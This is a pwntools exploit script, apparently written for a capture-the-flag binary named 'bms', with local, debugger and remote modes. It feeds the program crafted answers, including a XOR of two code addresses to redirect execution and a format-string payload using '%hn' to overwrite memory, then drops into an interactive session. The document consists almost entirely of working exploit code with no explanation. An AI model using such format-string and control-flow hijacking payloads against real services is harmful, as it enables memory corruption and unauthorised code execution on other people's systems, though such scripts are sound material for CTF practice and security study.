#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './bms' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '', 1337 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break bye
break vuln
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================




# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(exe)
    
    io.sendlineafter(b'?', b'11')
    io.sendlineafter(b'?', b'0')
    xor = 0x4014fa^0x4014bf
    io.sendlineafter(b'?', f'{xor}'.encode())
    
    ad = 0xfdf7
    payload = f"%{ad}c%9$hn".encode()
    io.sendafter(b'?', payload.ljust(20, b'\x00'))
    
    info(f'xor: {0x4014fa^0x4014bf}')
    
    # write one byte 
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()